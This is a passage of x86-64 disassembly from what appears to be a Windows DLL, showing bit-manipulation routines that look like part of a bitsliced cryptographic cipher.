   180001710:	48 c1 e0 04          	shl    $0x4,%rax
   180001714:	49 03 c4             	add    %r12,%rax
   180001717:	41 83 e1 03          	and    $0x3,%r9d
   18000171b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   180001720:	44 0f b6 06          	movzbl (%rsi),%r8d
   180001724:	48 ff c6             	inc    %rsi
   180001727:	41 0f b6 c8          	movzbl %r8b,%ecx
   18000172b:	41 d0 e8             	shr    $1,%r8b
   18000172e:	80 e1 01             	and    $0x1,%cl
   180001731:	0f b6 d1             	movzbl %cl,%edx
   180001734:	41 8b c9             	mov    %r9d,%ecx
   180001737:	66 d3 e2             	shl    %cl,%dx
   18000173a:	41 0f b6 c8          	movzbl %r8b,%ecx
   18000173e:	66 09 10             	or     %dx,(%rax)
   180001741:	80 e1 01             	and    $0x1,%cl
   180001744:	0f b6 d1             	movzbl %cl,%edx
   180001747:	41 8b c9             	mov    %r9d,%ecx
   18000174a:	66 d3 e2             	shl    %cl,%dx
   18000174d:	66 09 50 02          	or     %dx,0x2(%rax)
   180001751:	41 d0 e8             	shr    $1,%r8b
   180001754:	41 0f b6 c8          	movzbl %r8b,%ecx
   180001758:	41 d0 e8             	shr    $1,%r8b
   18000175b:	80 e1 01             	and    $0x1,%cl
   18000175e:	0f b6 d1             	movzbl %cl,%edx
   180001761:	41 8b c9             	mov    %r9d,%ecx
   180001764:	66 d3 e2             	shl    %cl,%dx
   180001767:	41 0f b6 c8          	movzbl %r8b,%ecx
   18000176b:	66 09 50 04          	or     %dx,0x4(%rax)
   18000176f:	80 e1 01             	and    $0x1,%cl
   180001772:	0f b6 d1             	movzbl %cl,%edx
   180001775:	41 8b c9             	mov    %r9d,%ecx
   180001778:	66 d3 e2             	shl    %cl,%dx
   18000177b:	66 09 50 06          	or     %dx,0x6(%rax)
   18000177f:	41 d0 e8             	shr    $1,%r8b
   180001782:	41 0f b6 c8          	movzbl %r8b,%ecx
   180001786:	41 d0 e8             	shr    $1,%r8b
   180001789:	80 e1 01             	and    $0x1,%cl
   18000178c:	0f b6 d1             	movzbl %cl,%edx
   18000178f:	41 8b c9             	mov    %r9d,%ecx
   180001792:	66 d3 e2             	shl    %cl,%dx
   180001795:	41 0f b6 c8          	movzbl %r8b,%ecx
   180001799:	66 09 50 08          	or     %dx,0x8(%rax)
   18000179d:	80 e1 01             	and    $0x1,%cl
   1800017a0:	0f b6 d1             	movzbl %cl,%edx
   1800017a3:	41 8b c9             	mov    %r9d,%ecx
   1800017a6:	66 d3 e2             	shl    %cl,%dx
   1800017a9:	66 09 50 0a          	or     %dx,0xa(%rax)
   1800017ad:	41 d0 e8             	shr    $1,%r8b
   1800017b0:	41 0f b6 c8          	movzbl %r8b,%ecx
   1800017b4:	41 d0 e8             	shr    $1,%r8b
   1800017b7:	80 e1 01             	and    $0x1,%cl
   1800017ba:	0f b6 d1             	movzbl %cl,%edx
   1800017bd:	41 8b c9             	mov    %r9d,%ecx
   1800017c0:	66 d3 e2             	shl    %cl,%dx
   1800017c3:	41 83 c1 04          	add    $0x4,%r9d
   1800017c7:	66 09 50 0c          	or     %dx,0xc(%rax)
   1800017cb:	41 0f b6 d0          	movzbl %r8b,%edx
   1800017cf:	66 d3 e2             	shl    %cl,%dx
   1800017d2:	66 09 50 0e          	or     %dx,0xe(%rax)
   1800017d6:	49 83 eb 01          	sub    $0x1,%r11
   1800017da:	0f 85 40 ff ff ff    	jne    0x180001720
   1800017e0:	41 ff c2             	inc    %r10d
   1800017e3:	48 ff c3             	inc    %rbx
   1800017e6:	45 3b d6             	cmp    %r14d,%r10d
   1800017e9:	0f 8c 11 ff ff ff    	jl     0x180001700
   1800017ef:	0f b7 df             	movzwl %di,%ebx
   1800017f2:	41 b8 11 11 00 00    	mov    $0x1111,%r8d
   1800017f8:	49 8d 46 ff          	lea    -0x1(%r14),%rax
   1800017fc:	48 c1 f8 02          	sar    $0x2,%rax
   180001800:	41 8d 4e ff          	lea    -0x1(%r14),%ecx
   180001804:	66 83 e1 03          	and    $0x3,%cx
   180001808:	41 8b f6             	mov    %r14d,%esi
   18000180b:	48 8d 14 c5 00 00 00 	lea    0x0(,%rax,8),%rdx
   180001812:	00 
   180001813:	41 0f b7 04 54       	movzwl (%r12,%rdx,2),%eax
   180001818:	66 d3 e8             	shr    %cl,%ax
   18000181b:	66 41 23 c0          	and    %r8w,%ax
   18000181f:	66 89 45 f0          	mov    %ax,-0x10(%rbp)
   180001823:	41 0f b7 44 54 02    	movzwl 0x2(%r12,%rdx,2),%eax
   180001829:	66 d3 e8             	shr    %cl,%ax
   18000182c:	66 41 23 c0          	and    %r8w,%ax
   180001830:	66 89 45 f2          	mov    %ax,-0xe(%rbp)
   180001834:	41 0f b7 44 54 04    	movzwl 0x4(%r12,%rdx,2),%eax
   18000183a:	66 d3 e8             	shr    %cl,%ax
   18000183d:	66 41 23 c0          	and    %r8w,%ax
   180001841:	66 89 45 f4          	mov    %ax,-0xc(%rbp)
   180001845:	41 0f b7 44 54 06    	movzwl 0x6(%r12,%rdx,2),%eax
   18000184b:	66 d3 e8             	shr    %cl,%ax
   18000184e:	66 41 23 c0          	and    %r8w,%ax
   180001852:	66 89 45 f6          	mov    %ax,-0xa(%rbp)
   180001856:	41 0f b7 44 54 08    	movzwl 0x8(%r12,%rdx,2),%eax
   18000185c:	66 d3 e8             	shr    %cl,%ax
   18000185f:	66 41 23 c0          	and    %r8w,%ax
   180001863:	66 89 45 f8          	mov    %ax,-0x8(%rbp)
   180001867:	41 0f b7 44 54 0a    	movzwl 0xa(%r12,%rdx,2),%eax
   18000186d:	66 d3 e8             	shr    %cl,%ax
   180001870:	66 41 23 c0          	and    %r8w,%ax
   180001874:	66 89 45 fa          	mov    %ax,-0x6(%rbp)
   180001878:	41 0f b7 44 54 0c    	movzwl 0xc(%r12,%rdx,2),%eax
   18000187e:	66 d3 e8             	shr    %cl,%ax
   180001881:	66 41 23 c0          	and    %r8w,%ax
   180001885:	66 89 45 fc          	mov    %ax,-0x4(%rbp)
   180001889:	41 0f b7 44 54 0e    	movzwl 0xe(%r12,%rdx,2),%eax
   18000188f:	66 d3 e8             	shr    %cl,%ax
   180001892:	66 41 23 c0          	and    %r8w,%ax
   180001896:	66 89 45 fe          	mov    %ax,-0x2(%rbp)
   18000189a:	42 8d 04 bd 04 00 00 	lea    0x4(,%r15,4),%eax
   1800018a1:	00 
   1800018a2:	44 3b f0             	cmp    %eax,%r14d
   1800018a5:	0f 8d 5a 01 00 00    	jge    0x180001a05
   1800018ab:	4d 8b fe             	mov    %r14,%r15
   1800018ae:	66 90                	xchg   %ax,%ax
   1800018b0:	85 ff                	test   %edi,%edi
   1800018b2:	0f 85 d6 00 00 00    	jne    0x18000198e
   1800018b8:	33 d2                	xor    %edx,%edx
   1800018ba:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   1800018be:	e8 9d 07 00 00       	call   0x180002060
   1800018c3:	44 8b 4d ec          	mov    -0x14(%rbp),%r9d
   1800018c7:	b9 04 00 00 00       	mov    $0x4,%ecx
   1800018cc:	44 0f b7 45 e6       	movzwl -0x1a(%rbp),%r8d
   1800018d1:	0f b7 45 f0          	movzwl -0x10(%rbp),%eax
   1800018d5:	44 0f b7 5d e4       	movzwl -0x1c(%rbp),%r11d
   1800018da:	66 d3 c8             	ror    %cl,%ax
   1800018dd:	66 41 33 c1          	xor    %r9w,%ax
   1800018e1:	66 44 89 45 e4       	mov    %r8w,-0x1c(%rbp)
   1800018e6:	66 89 45 f0          	mov    %ax,-0x10(%rbp)
   1800018ea:	0f b7 45 f2          	movzwl -0xe(%rbp),%eax
   1800018ee:	66 d3 c8             	ror    %cl,%ax
   1800018f1:	66 33 c3             	xor    %bx,%ax
   1800018f4:	66 89 45 f2          	mov    %ax,-0xe(%rbp)
   1800018f8:	0f b7 45 f4          	movzwl -0xc(%rbp),%eax
   1800018fc:	66 d3 c8             	ror    %cl,%ax
   1800018ff:	66 33 45 ea          	xor    -0x16(%rbp),%ax
   180001903:	66 89 45 f4          	mov    %ax,-0xc(%rbp)
   180001907:	0f b7 45 f6          	movzwl -0xa(%rbp),%eax
   18000190b:	66 d3 c8             	ror    %cl,%ax
   18000190e:	66 33 45 e8          	xor    -0x18(%rbp),%ax
   180001912:	66 89 45 f6          	mov    %ax,-0xa(%rbp)
   180001916:	0f b7 45 f8          	movzwl -0x8(%rbp),%eax
   18000191a:	66 d3 c8             	ror    %cl,%ax
   18000191d:	66 41 33 c0          	xor    %r8w,%ax
   180001921:	66 89 45 f8          	mov    %ax,-0x8(%rbp)
   180001925:	0f b7 45 fa          	movzwl -0x6(%rbp),%eax
   180001929:	66 d3 c8             	ror    %cl,%ax
   18000192c:	66 41 33 c3          	xor    %r11w,%ax
   180001930:	66 89 45 fa          	mov    %ax,-0x6(%rbp)
   180001934:	0f b7 45 fc          	movzwl -0x4(%rbp),%eax
   180001938:	66 d3 c8             	ror    %cl,%ax
   18000193b:	66 33 45 50          	xor    0x50(%rbp),%ax
   18000193f:	66 89 45 fc          	mov    %ax,-0x4(%rbp)
   180001943:	0f b7 45 fe          	movzwl -0x2(%rbp),%eax
   180001947:	66 d3 c8             	ror    %cl,%ax
   18000194a:	66 33 45 e2          	xor    -0x1e(%rbp),%ax
   18000194e:	0f b7 4d 50          	movzwl 0x50(%rbp),%ecx
   180001952:	66 89 45 fe          	mov    %ax,-0x2(%rbp)
   180001956:	0f b7 45 e2          	movzwl -0x1e(%rbp),%eax
   18000195a:	66 89 4d e2          	mov    %cx,-0x1e(%rbp)
   18000195e:	0f b7 c8             	movzwl %ax,%ecx
   180001961:	66 33 4d e8          	xor    -0x18(%rbp),%cx
   180001965:	66 89 4d e6          	mov    %cx,-0x1a(%rbp)
   180001969:	0f b7 c8             	movzwl %ax,%ecx
   18000196c:	66 33 4d ea          	xor    -0x16(%rbp),%cx
   180001970:	66 89 4d e8          	mov    %cx,-0x18(%rbp)
   180001974:	0f b7 c8             	movzwl %ax,%ecx
   180001977:	66 41 33 c9          	xor    %r9w,%cx
   18000197b:	66 44 89 5d 50       	mov    %r11w,0x50(%rbp)
   180001980:	66 89 4d e0          	mov    %cx,-0x20(%rbp)
   180001984:	66 89 5d ea          	mov    %bx,-0x16(%rbp)
   180001988:	66 89 45 ec          	mov    %ax,-0x14(%rbp)
   18000198c:	eb 16                	jmp    0x1800019a4
   18000198e:	41 83 fe 06          	cmp    $0x6,%r14d
   180001992:	7e 10                	jle    0x1800019a4
   180001994:	83 ff 04             	cmp    $0x4,%edi
   180001997:	75 0b                	jne    0x1800019a4
   180001999:	33 d2                	xor    %edx,%edx
   18000199b:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   18000199f:	e8 bc 06 00 00       	call   0x180002060
   1800019a4:	8b c6                	mov    %esi,%eax
   1800019a6:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   1800019aa:	41 2b c6             	sub    %r14d,%eax
   1800019ad:	8d 5f 01             	lea    0x1(%rdi),%ebx
   1800019b0:	83 e0 03             	and    $0x3,%eax
   1800019b3:	4d 8b c7             	mov    %r15,%r8
   1800019b6:	4d 2b c6             	sub    %r14,%r8
   1800019b9:	89 44 24 20          	mov    %eax,0x20(%rsp)
   1800019bd:	49 c1 f8 02          	sar    $0x2,%r8
   1800019c1:	49 8b d7             	mov    %r15,%rdx
   1800019c4:	48 c1 fa 02          	sar    $0x2,%rdx
   1800019c8:	44 8b ce             	mov    %esi,%r9d
   1800019cb:	49 c1 e0 04          	shl    $0x4,%r8
   1800019cf:	41 83 e1 03          	and    $0x3,%r9d
   1800019d3:	48 c1 e2 04          	shl    $0x4,%rdx
   1800019d7:	4d 03 c4             	add    %r12,%r8
   1800019da:	49 03 d4             	add    %r12,%rdx
   1800019dd:	e8 3e 00 00 00       	call   0x180001a20
   1800019e2:	8b 4d 58             	mov    0x58(%rbp),%ecx
   1800019e5:	33 ff                	xor    %edi,%edi
   1800019e7:	ff c6                	inc    %esi
   1800019e9:	49 ff c7             	inc    %r15
   1800019ec:	41 3b de             	cmp    %r14d,%ebx
   1800019ef:	0f 45 fb             	cmovne %ebx,%edi
   1800019f2:	8d 04 8d 04 00 00 00 	lea    0x4(,%rcx,4),%eax
   1800019f9:	0f b7 5d e0          	movzwl -0x20(%rbp),%ebx
   1800019fd:	3b f0                	cmp    %eax,%esi
   1800019ff:	0f 8c ab fe ff ff    	jl     0x1800018b0
   180001a05:	48 8b 9c 24 90 00 00 	mov    0x90(%rsp),%rbx
   180001a0c:	00 
   180001a0d:	48 83 c4 50          	add    $0x50,%rsp
   180001a11:	41 5f                	pop    %r15
   180001a13:	41 5e                	pop    %r14
   180001a15:	41 5d                	pop    %r13
   180001a17:	41 5c                	pop    %r12
   180001a19:	5f                   	pop    %rdi
   180001a1a:	5e                   	pop    %rsi
   180001a1b:	5d                   	pop    %rbp
   180001a1c:	c3                   	ret
   180001a1d:	cc                   	int3
   180001a1e:	cc                   	int3
   180001a1f:	cc                   	int3
   180001a20:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180001a25:	41 0f b7 00          	movzwl (%r8),%eax
   180001a29:	4c 8b d9             	mov    %rcx,%r11
   180001a2c:	44 0f b7 54 24 28    	movzwl 0x28(%rsp),%r10d
   180001a32:	bb 11 11 00 00       	mov    $0x1111,%ebx
   180001a37:	41 0f b6 ca          	movzbl %r10b,%ecx
   180001a3b:	66 d3 e8             	shr    %cl,%ax
   180001a3e:	41 8b c9             	mov    %r9d,%ecx
   180001a41:	66 23 c3             	and    %bx,%ax
   180001a44:	66 41 31 03          	xor    %ax,(%r11)
   180001a48:	41 0f b7 03          	movzwl (%r11),%eax
   180001a4c:	66 23 c3             	and    %bx,%ax
   180001a4f:	66 d3 e0             	shl    %cl,%ax
   180001a52:	41 0f b6 ca          	movzbl %r10b,%ecx
   180001a56:	66 09 02             	or     %ax,(%rdx)
   180001a59:	41 0f b7 40 02       	movzwl 0x2(%r8),%eax
   180001a5e:	66 d3 e8             	shr    %cl,%ax
   180001a61:	41 8b c9             	mov    %r9d,%ecx
   180001a64:	66 23 c3             	and    %bx,%ax
   180001a67:	66 41 33 43 02       	xor    0x2(%r11),%ax
   180001a6c:	66 41 89 43 02       	mov    %ax,0x2(%r11)
   180001a71:	66 23 c3             	and    %bx,%ax
   180001a74:	66 d3 e0             	shl    %cl,%ax
   180001a77:	41 0f b6 ca          	movzbl %r10b,%ecx
   180001a7b:	66 09 42 02          	or     %ax,0x2(%rdx)
   180001a7f:	41 0f b7 40 04       	movzwl 0x4(%r8),%eax
   180001a84:	66 d3 e8             	shr    %cl,%ax
   180001a87:	41 8b c9             	mov    %r9d,%ecx
   180001a8a:	66 23 c3             	and    %bx,%ax
   180001a8d:	66 41 33 43 04       	xor    0x4(%r11),%ax
   180001a92:	66 41 89 43 04       	mov    %ax,0x4(%r11)
   180001a97:	66 23 c3             	and    %bx,%ax
   180001a9a:	66 d3 e0             	shl    %cl,%ax
   180001a9d:	41 0f b6 ca          	movzbl %r10b,%ecx
   180001aa1:	66 09 42 04          	or     %ax,0x4(%rdx)
   180001aa5:	41 0f b7 40 06       	movzwl 0x6(%r8),%eax
   180001aaa:	66 d3 e8             	shr    %cl,%ax
   180001aad:	41 8b c9             	mov    %r9d,%ecx
   180001ab0:	66 23 c3             	and    %bx,%ax
   180001ab3:	66 41 33 43 06       	xor    0x6(%r11),%ax
   180001ab8:	66 41 89 43 06       	mov    %ax,0x6(%r11)
   180001abd:	66 23 c3             	and    %bx,%ax
   180001ac0:	66 d3 e0             	shl    %cl,%ax
   180001ac3:	41 0f b6 ca          	movzbl %r10b,%ecx
   180001ac7:	66 09 42 06          	or     %ax,0x6(%rdx)
   180001acb:	41 0f b7 40 08       	movzwl 0x8(%r8),%eax
   180001ad0:	66 d3 e8             	shr    %cl,%ax
   180001ad3:	41 8b c9             	mov    %r9d,%ecx
   180001ad6:	66 23 c3             	and    %bx,%ax
   180001ad9:	66 41 33 43 08       	xor    0x8(%r11),%ax
   180001ade:	66 41 89 43 08       	mov    %ax,0x8(%r11)
   180001ae3:	66 23 c3             	and    %bx,%ax
   180001ae6:	66 d3 e0             	shl    %cl,%ax
   180001ae9:	41 0f b6 ca          	movzbl %r10b,%ecx
   180001aed:	66 09 42 08          	or     %ax,0x8(%rdx)
   180001af1:	41 0f b7 40 0a       	movzwl 0xa(%r8),%eax
   180001af6:	66 d3 e8             	shr    %cl,%ax
   180001af9:	41 8b c9             	mov    %r9d,%ecx
   180001afc:	66 23 c3             	and    %bx,%ax
   180001aff:	66 41 33 43 0a       	xor    0xa(%r11),%ax
   180001b04:	66 41 89 43 0a       	mov    %ax,0xa(%r11)
   180001b09:	66 23 c3             	and    %bx,%ax
   180001b0c:	66 d3 e0             	shl    %cl,%ax
   180001b0f:	41 0f b6 ca          	movzbl %r10b,%ecx
   180001b13:	66 09 42 0a          	or     %ax,0xa(%rdx)
   180001b17:	41 0f b7 40 0c       	movzwl 0xc(%r8),%eax
   180001b1c:	66 d3 e8             	shr    %cl,%ax
   180001b1f:	41 8b c9             	mov    %r9d,%ecx
   180001b22:	66 23 c3             	and    %bx,%ax
   180001b25:	66 41 33 43 0c       	xor    0xc(%r11),%ax
   180001b2a:	66 41 89 43 0c       	mov    %ax,0xc(%r11)
   180001b2f:	66 23 c3             	and    %bx,%ax
   180001b32:	66 d3 e0             	shl    %cl,%ax
   180001b35:	41 0f b6 ca          	movzbl %r10b,%ecx
   180001b39:	66 09 42 0c          	or     %ax,0xc(%rdx)
   180001b3d:	41 0f b7 40 0e       	movzwl 0xe(%r8),%eax
   180001b42:	66 d3 e8             	shr    %cl,%ax
   180001b45:	41 8b c9             	mov    %r9d,%ecx
   180001b48:	66 23 c3             	and    %bx,%ax
   180001b4b:	66 41 33 43 0e       	xor    0xe(%r11),%ax
   180001b50:	66 41 89 43 0e       	mov    %ax,0xe(%r11)
   180001b55:	66 23 c3             	and    %bx,%ax
   180001b58:	48 8b 5c 24 08       	mov    0x8(%rsp),%rbx
   180001b5d:	66 d3 e0             	shl    %cl,%ax
   180001b60:	66 09 42 0e          	or     %ax,0xe(%rdx)
   180001b64:	c3                   	ret
   180001b65:	cc                   	int3
   180001b66:	cc                   	int3
   180001b67:	cc                   	int3
   180001b68:	cc                   	int3
   180001b69:	cc                   	int3
   180001b6a:	cc                   	int3
   180001b6b:	cc                   	int3
   180001b6c:	cc                   	int3
   180001b6d:	cc                   	int3
   180001b6e:	cc                   	int3
   180001b6f:	cc                   	int3
   180001b70:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180001b75:	48 89 6c 24 20       	mov    %rbp,0x20(%rsp)
   180001b7a:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   180001b7f:	56                   	push   %rsi
   180001b80:	57                   	push   %rdi
   180001b81:	41 54                	push   %r12
   180001b83:	41 55                	push   %r13
   180001b85:	41 56                	push   %r14
   180001b87:	41 57                	push   %r15
   180001b89:	44 0f b7 19          	movzwl (%rcx),%r11d
   180001b8d:	45 33 d2             	xor    %r10d,%r10d
   180001b90:	0f b7 59 02          	movzwl 0x2(%rcx),%ebx
   180001b94:	48 8b c1             	mov    %rcx,%rax
   180001b97:	0f b7 79 04          	movzwl 0x4(%rcx),%edi
   180001b9b:	0f b7 71 06          	movzwl 0x6(%rcx),%esi
   180001b9f:	0f b7 69 08          	movzwl 0x8(%rcx),%ebp
   180001ba3:	44 0f b7 71 0a       	movzwl 0xa(%rcx),%r14d
   180001ba8:	44 0f b7 79 0c       	movzwl 0xc(%rcx),%r15d
   180001bad:	44 0f b7 61 0e       	movzwl 0xe(%rcx),%r12d
   180001bb2:	44 89 54 24 48       	mov    %r10d,0x48(%rsp)
   180001bb7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   180001bbe:	00 00 
   180001bc0:	45 8b ca             	mov    %r10d,%r9d
   180001bc3:	41 bd 04 00 00 00    	mov    $0x4,%r13d
   180001bc9:	4c 8b 54 24 40       	mov    0x40(%rsp),%r10
   180001bce:	66 90                	xchg   %ax,%ax
   180001bd0:	45 0f b6 02          	movzbl (%r10),%r8d
   180001bd4:	49 ff c2             	inc    %r10
   180001bd7:	41 0f b6 c8          	movzbl %r8b,%ecx
   180001bdb:	41 d0 e8             	shr    $1,%r8b
   180001bde:	80 e1 01             	and    $0x1,%cl
   180001be1:	0f b6 d1             	movzbl %cl,%edx
   180001be4:	41 8b c9             	mov    %r9d,%ecx
   180001be7:	66 d3 e2             	shl    %cl,%dx
   180001bea:	41 0f b6 c8          	movzbl %r8b,%ecx
   180001bee:	80 e1 01             	and    $0x1,%cl
   180001bf1:	41 d0 e8             	shr    $1,%r8b
   180001bf4:	66 44 0b da          	or     %dx,%r11w
   180001bf8:	0f b6 d1             	movzbl %cl,%edx
   180001bfb:	41 8b c9             	mov    %r9d,%ecx
   180001bfe:	66 44 89 18          	mov    %r11w,(%rax)
   180001c02:	66 d3 e2             	shl    %cl,%dx
   180001c05:	41 0f b6 c8          	movzbl %r8b,%ecx
   180001c09:	80 e1 01             	and    $0x1,%cl
   180001c0c:	41 d0 e8             	shr    $1,%r8b
   180001c0f:	66 0b da             	or     %dx,%bx
   180001c12:	0f b6 d1             	movzbl %cl,%edx
   180001c15:	41 8b c9             	mov    %r9d,%ecx
   180001c18:	66 89 58 02          	mov    %bx,0x2(%rax)
   180001c1c:	66 d3 e2             	shl    %cl,%dx
   180001c1f:	41 0f b6 c8          	movzbl %r8b,%ecx
   180001c23:	80 e1 01             	and    $0x1,%cl
   180001c26:	41 d0 e8             	shr    $1,%r8b
   180001c29:	66 0b fa             	or     %dx,%di
   180001c2c:	0f b6 d1             	movzbl %cl,%edx
   180001c2f:	41 8b c9             	mov    %r9d,%ecx
   180001c32:	66 89 78 04          	mov    %di,0x4(%rax)
   180001c36:	66 d3 e2             	shl    %cl,%dx
   180001c39:	41 0f b6 c8          	movzbl %r8b,%ecx
   180001c3d:	66 0b f2             	or     %dx,%si
   180001c40:	41 d0 e8             	shr    $1,%r8b
   180001c43:	80 e1 01             	and    $0x1,%cl
   180001c46:	66 89 70 06          	mov    %si,0x6(%rax)
   180001c4a:	0f b6 d1             	movzbl %cl,%edx
   180001c4d:	41 8b c9             	mov    %r9d,%ecx
   180001c50:	66 d3 e2             	shl    %cl,%dx
   180001c53:	41 0f b6 c8          	movzbl %r8b,%ecx
   180001c57:	66 0b ea             	or     %dx,%bp
   180001c5a:	41 d0 e8             	shr    $1,%r8b
   180001c5d:	80 e1 01             	and    $0x1,%cl
   180001c60:	66 89 68 08          	mov    %bp,0x8(%rax)
   180001c64:	0f b6 d1             	movzbl %cl,%edx
   180001c67:	41 8b c9             	mov    %r9d,%ecx
   180001c6a:	66 d3 e2             	shl    %cl,%dx
   180001c6d:	41 0f b6 c8          	movzbl %r8b,%ecx
   180001c71:	66 44 0b f2          	or     %dx,%r14w
   180001c75:	41 d0 e8             	shr    $1,%r8b
   180001c78:	80 e1 01             	and    $0x1,%cl
   180001c7b:	66 44 89 70 0a       	mov    %r14w,0xa(%rax)
   180001c80:	0f b6 d1             	movzbl %cl,%edx
   180001c83:	41 8b c9             	mov    %r9d,%ecx
   180001c86:	66 d3 e2             	shl    %cl,%dx
   180001c89:	41 83 c1 04          	add    $0x4,%r9d
   180001c8d:	66 44 0b fa          	or     %dx,%r15w
   180001c91:	41 0f b6 d0          	movzbl %r8b,%edx
   180001c95:	66 d3 e2             	shl    %cl,%dx
   180001c98:	66 44 0b e2          	or     %dx,%r12w
   180001c9c:	66 44 89 78 0c       	mov    %r15w,0xc(%rax)
   180001ca1:	66 44 89 60 0e       	mov    %r12w,0xe(%rax)
   180001ca6:	49 83 ed 01          	sub    $0x1,%r13
   180001caa:	0f 85 20 ff ff ff    	jne    0x180001bd0
   180001cb0:	4c 89 54 24 40       	mov    %r10,0x40(%rsp)
   180001cb5:	44 8b 54 24 48       	mov    0x48(%rsp),%r10d
   180001cba:	41 ff c2             	inc    %r10d
   180001cbd:	44 89 54 24 48       	mov    %r10d,0x48(%rsp)
   180001cc2:	41 83 fa 04          	cmp    $0x4,%r10d
   180001cc6:	0f 8c f4 fe ff ff    	jl     0x180001bc0
   180001ccc:	48 8b 5c 24 38       	mov    0x38(%rsp),%rbx
   180001cd1:	48 8b 6c 24 50       	mov    0x50(%rsp),%rbp
   180001cd6:	41 5f                	pop    %r15
   180001cd8:	41 5e                	pop    %r14
   180001cda:	41 5d                	pop    %r13
   180001cdc:	41 5c                	pop    %r12
   180001cde:	5f                   	pop    %rdi
   180001cdf:	5e                   	pop    %rsi
   180001ce0:	c3                   	ret
   180001ce1:	cc                   	int3
   180001ce2:	cc                   	int3
   180001ce3:	cc                   	int3
   180001ce4:	cc                   	int3
   180001ce5:	cc                   	int3
   180001ce6:	cc                   	int3
   180001ce7:	cc                   	int3
   180001ce8:	cc                   	int3
   180001ce9:	cc                   	int3
   180001cea:	cc                   	int3
   180001ceb:	cc                   	int3
   180001cec:	cc                   	int3
   180001ced:	cc                   	int3
   180001cee:	cc                   	int3
   180001cef:	cc                   	int3
   180001cf0:	89 54 24 10          	mov    %edx,0x10(%rsp)
   180001cf4:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   180001cf9:	53                   	push   %rbx
   180001cfa:	55                   	push   %rbp
   180001cfb:	56                   	push   %rsi
   180001cfc:	57                   	push   %rdi
   180001cfd:	41 54                	push   %r12
   180001cff:	41 55                	push   %r13
   180001d01:	41 56                	push   %r14
   180001d03:	41 57                	push   %r15
   180001d05:	48 83 ec 18          	sub    $0x18,%rsp
   180001d09:	44 0f b7 01          	movzwl (%rcx),%r8d
   180001d0d:	44 0f b7 69 0c       	movzwl 0xc(%rcx),%r13d
   180001d12:	44 0f b7 51 02       	movzwl 0x2(%rcx),%r10d
   180001d17:	41 0f b7 ed          	movzwl %r13w,%ebp
   180001d1b:	0f b7 79 04          	movzwl 0x4(%rcx),%edi
   180001d1f:	41 0f b7 d2          	movzwl %r10w,%edx
   180001d23:	44 0f b7 71 06       	movzwl 0x6(%rcx),%r14d
   180001d28:	44 0f b7 cf          	movzwl %di,%r9d
   180001d2c:	44 0f b7 79 08       	movzwl 0x8(%rcx),%r15d
   180001d31:	45 0f b7 de          	movzwl %r14w,%r11d
   180001d35:	44 0f b7 61 0a       	movzwl 0xa(%rcx),%r12d
   180001d3a:	41 0f b7 df          	movzwl %r15w,%ebx
   180001d3e:	0f b7 41 0e          	movzwl 0xe(%rcx),%eax
   180001d42:	41 0f b7 f4          	movzwl %r12w,%esi
   180001d46:	66 44 89 2c 24       	mov    %r13w,(%rsp)
   180001d4b:	b9 04 00 00 00       	mov    $0x4,%ecx
   180001d50:	66 89 44 24 78       	mov    %ax,0x78(%rsp)
   180001d55:	41 0f b7 c0          	movzwl %r8w,%eax
   180001d59:	66 d3 c8             	ror    %cl,%ax
   180001d5c:	66 41 33 c0          	xor    %r8w,%ax
   180001d60:	66 d3 cd             	ror    %cl,%bp
   180001d63:	66 41 33 ed          	xor    %r13w,%bp
   180001d67:	66 d3 ca             	ror    %cl,%dx
   180001d6a:	44 0f b7 6c 24 78    	movzwl 0x78(%rsp),%r13d
   180001d70:	66 41 33 d2          	xor    %r10w,%dx
   180001d74:	66 41 d3 cd          	ror    %cl,%r13w
   180001d78:	66 44 33 6c 24 78    	xor    0x78(%rsp),%r13w
   180001d7e:	66 44 89 6c 24 70    	mov    %r13w,0x70(%rsp)
   180001d84:	44 0f b7 e8          	movzwl %ax,%r13d
   180001d88:	66 41 d3 c9          	ror    %cl,%r9w
   180001d8c:	66 44 33 cf          	xor    %di,%r9w
   180001d90:	66 41 d3 cb          	ror    %cl,%r11w
   180001d94:	66 45 33 de          	xor    %r14w,%r11w
   180001d98:	66 c1 c7 04          	rol    $0x4,%di
   180001d9c:	66 41 c1 c6 04       	rol    $0x4,%r14w
   180001da1:	66 d3 cb             	ror    %cl,%bx
   180001da4:	66 41 33 df          	xor    %r15w,%bx
   180001da8:	66 d3 ce             	ror    %cl,%si
   180001dab:	66 41 c1 c7 04       	rol    $0x4,%r15w
   180001db0:	66 41 d3 cd          	ror    %cl,%r13w
   180001db4:	66 41 33 f4          	xor    %r12w,%si
   180001db8:	66 41 c1 c0 04       	rol    $0x4,%r8w
   180001dbd:	66 45 33 e8          	xor    %r8w,%r13w
   180001dc1:	66 41 c1 c2 04       	rol    $0x4,%r10w
   180001dc6:	66 44 33 6c 24 70    	xor    0x70(%rsp),%r13w
   180001dcc:	4c 8b 44 24 60       	mov    0x60(%rsp),%r8
   180001dd1:	66 44 89 6c 24 02    	mov    %r13w,0x2(%rsp)
   180001dd7:	66 41 c1 c4 04       	rol    $0x4,%r12w
   180001ddc:	66 45 89 28          	mov    %r13w,(%r8)
   180001de0:	44 0f b7 ea          	movzwl %dx,%r13d
   180001de4:	66 41 d3 cd          	ror    %cl,%r13w
   180001de8:	66 45 33 ea          	xor    %r10w,%r13w
   180001dec:	44 0f b7 54 24 70    	movzwl 0x70(%rsp),%r10d
   180001df2:	66 45 33 ea          	xor    %r10w,%r13w
   180001df6:	66 44 33 e8          	xor    %ax,%r13w
   180001dfa:	41 0f b7 c1          	movzwl %r9w,%eax
   180001dfe:	66 d3 c8             	ror    %cl,%ax
   180001e01:	66 33 c7             	xor    %di,%ax
   180001e04:	66 44 89 6c 24 60    	mov    %r13w,0x60(%rsp)
   180001e0a:	66 33 c2             	xor    %dx,%ax
   180001e0d:	66 45 89 68 02       	mov    %r13w,0x2(%r8)
   180001e12:	41 0f b7 fb          	movzwl %r11w,%edi
   180001e16:	66 89 44 24 70       	mov    %ax,0x70(%rsp)
   180001e1b:	66 d3 cf             	ror    %cl,%di
